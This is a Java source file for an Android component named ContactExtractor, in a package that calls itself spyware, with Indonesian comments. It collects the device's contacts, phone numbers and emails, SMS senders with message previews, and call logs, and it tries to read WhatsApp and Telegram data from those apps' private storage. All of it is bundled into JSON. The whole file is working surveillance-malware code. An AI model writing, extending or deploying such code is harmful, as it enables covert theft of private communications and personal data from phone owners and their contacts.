package com.spyware.korban;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ContactExtractor {
    private static final String TAG = "CONTACT_EXTRACT";
    private Context context;
    private List<Map<String, String>> allContacts = new ArrayList<>();

    public ContactExtractor(Context context) {
        this.context = context;
    }

    public void extractAllContacts() {
        try {
            extractFromSystemContacts();
            extractFromWhatsAppContacts();
            extractFromTelegramContacts();
            extractFromSMSContacts();
            extractFromCallLogContacts();
            Log.d(TAG, "Total kontak extracted: " + allContacts.size());
        } catch (Exception e) {
            Log.e(TAG, "Extract error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // SYSTEM CONTACTS - Kontak default Android
    // ════════════════════════════════════════════════════════════
    private void extractFromSystemContacts() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    // Ambil nomor telepon
                    Cursor phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );

                    if (phoneCursor != null && phoneCursor.getCount() > 0) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(
                                phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            );
                            int phoneType = phoneCursor.getInt(
                                phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                            );

                            Map<String, String> contact = new HashMap<>();
                            contact.put("app", "System Contacts");
                            contact.put("nama", displayName);
                            contact.put("nomor", phoneNumber.replaceAll("[^0-9+]", ""));
                            contact.put("tipe", getPhoneType(phoneType));
                            contact.put("waktu", System.currentTimeMillis() + "");
                            allContacts.add(contact);
                        }
                        phoneCursor.close();
                    }

                    // Ambil email
                    Cursor emailCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );

                    if (emailCursor != null && emailCursor.getCount() > 0) {
                        while (emailCursor.moveToNext()) {
                            String email = emailCursor.getString(
                                emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                            );

                            Map<String, String> contact = new HashMap<>();
                            contact.put("app", "System Contacts");
                            contact.put("nama", displayName);
                            contact.put("email", email);
                            contact.put("waktu", System.currentTimeMillis() + "");
                            allContacts.add(contact);
                        }
                        emailCursor.close();
                    }
                }
                cursor.close();
            }
            Log.d(TAG, "System contacts extracted");
        } catch (Exception e) {
            Log.e(TAG, "extractFromSystemContacts error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // WHATSAPP CONTACTS
    // ════════════════════════════════════════════════════════════
    private void extractFromWhatsAppContacts() {
        try {
            String whatsappPath = "/data/data/com.whatsapp/databases/";
            File whatsappDir = new File(whatsappPath);

            if (whatsappDir.exists()) {
                File[] dbFiles = whatsappDir.listFiles((dir, name) -> name.contains("msgstore") || name.equals("wa.db"));
                if (dbFiles != null) {
                    for (File db : dbFiles) {
                        // Extract kontak dari WA database via content provider
                        try {
                            ContentResolver resolver = context.getContentResolver();
                            Uri waUri = Uri.parse("content://com.whatsapp.provider.message");
                            Cursor cursor = resolver.query(waUri, null, null, null, null);

                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    try {
                                        String key_remote_jid = cursor.getString(cursor.getColumnIndex("key_remote_jid"));
                                        if (key_remote_jid != null && key_remote_jid.contains("@")) {
                                            String phone = key_remote_jid.split("@")[0];
                                            Map<String, String> contact = new HashMap<>();
                                            contact.put("app", "WhatsApp");
                                            contact.put("nomor", phone);
                                            contact.put("waktu", System.currentTimeMillis() + "");
                                            allContacts.add(contact);
                                        }
                                    } catch (Exception e) {}
                                }
                                cursor.close();
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "WA db error: " + e.getMessage());
                        }
                    }
                }
            }
            Log.d(TAG, "WhatsApp contacts extracted");
        } catch (Exception e) {
            Log.e(TAG, "extractFromWhatsAppContacts error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // TELEGRAM CONTACTS
    // ════════════════════════════════════════════════════════════
    private void extractFromTelegramContacts() {
        try {
            String telegramPath = "/data/data/org.telegram.messenger/databases/";
            File telegramDir = new File(telegramPath);

            if (telegramDir.exists()) {
                File[] dbFiles = telegramDir.listFiles((dir, name) -> name.endsWith(".db"));
                if (dbFiles != null) {
                    for (File db : dbFiles) {
                        try {
                            ContentResolver resolver = context.getContentResolver();
                            Uri tgUri = Uri.parse("content://org.telegram.messenger.provider");
                            Cursor cursor = resolver.query(tgUri, null, null, null, null);

                            if (cursor != null && cursor.getCount() > 0) {
                                while (cursor.moveToNext()) {
                                    try {
                                        String phone = cursor.getString(0);
                                        if (phone != null && phone.matches("[0-9+]+")) {
                                            Map<String, String> contact = new HashMap<>();
                                            contact.put("app", "Telegram");
                                            contact.put("nomor", phone);
                                            contact.put("waktu", System.currentTimeMillis() + "");
                                            allContacts.add(contact);
                                        }
                                    } catch (Exception e) {}
                                }
                                cursor.close();
                            }
                        } catch (Exception e) {}
                    }
                }
            }
            Log.d(TAG, "Telegram contacts extracted");
        } catch (Exception e) {
            Log.e(TAG, "extractFromTelegramContacts error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // SMS CONTACTS
    // ════════════════════════════════════════════════════════════
    private void extractFromSMSContacts() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri smsUri = Uri.parse("content://sms");
            Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    try {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));

                        if (address != null && !address.isEmpty()) {
                            Map<String, String> contact = new HashMap<>();
                            contact.put("app", "SMS");
                            contact.put("nomor", address.replaceAll("[^0-9+]", ""));
                            contact.put("preview_msg", body != null ? body.substring(0, Math.min(50, body.length())) : "");
                            contact.put("waktu", date);
                            allContacts.add(contact);
                        }
                    } catch (Exception e) {}
                }
                cursor.close();
            }
            Log.d(TAG, "SMS contacts extracted");
        } catch (Exception e) {
            Log.e(TAG, "extractFromSMSContacts error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // CALL LOG CONTACTS
    // ════════════════════════════════════════════════════════════
    private void extractFromCallLogContacts() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri callLogUri = Uri.parse("content://call_log/calls");
            Cursor cursor = contentResolver.query(callLogUri, null, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    try {
                        String number = cursor.getString(cursor.getColumnIndex("number"));
                        String name = cursor.getString(cursor.getColumnIndex("name"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));
                        int duration = cursor.getInt(cursor.getColumnIndex("duration"));

                        Map<String, String> contact = new HashMap<>();
                        contact.put("app", "Call Log");
                        contact.put("nomor", number.replaceAll("[^0-9+]", ""));
                        contact.put("nama", name != null ? name : "Unknown");
                        contact.put("durasi_detik", duration + "");
                        contact.put("waktu", date);
                        allContacts.add(contact);
                    } catch (Exception e) {}
                }
                cursor.close();
            }
            Log.d(TAG, "Call log contacts extracted");
        } catch (Exception e) {
            Log.e(TAG, "extractFromCallLogContacts error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════════════════
    // CONVERT TO JSON
    // ════════════════════════════════════════════════════════════
    public JSONArray toJSONArray() {
        JSONArray jsonArray = new JSONArray();
        for (Map<String, String> contact : allContacts) {
            JSONObject jsonObject = new JSONObject(contact);
            jsonArray.put(jsonObject);
        }
        return jsonArray;
    }

    public String toJSONString() {
        return toJSONArray().toString();
    }

    public List<Map<String, String>> getContacts() {
        return allContacts;
    }

    public int getTotalContacts() {
        return allContacts.size();
    }

    private String getPhoneType(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            default:
                return "Other";
        }
    }
}
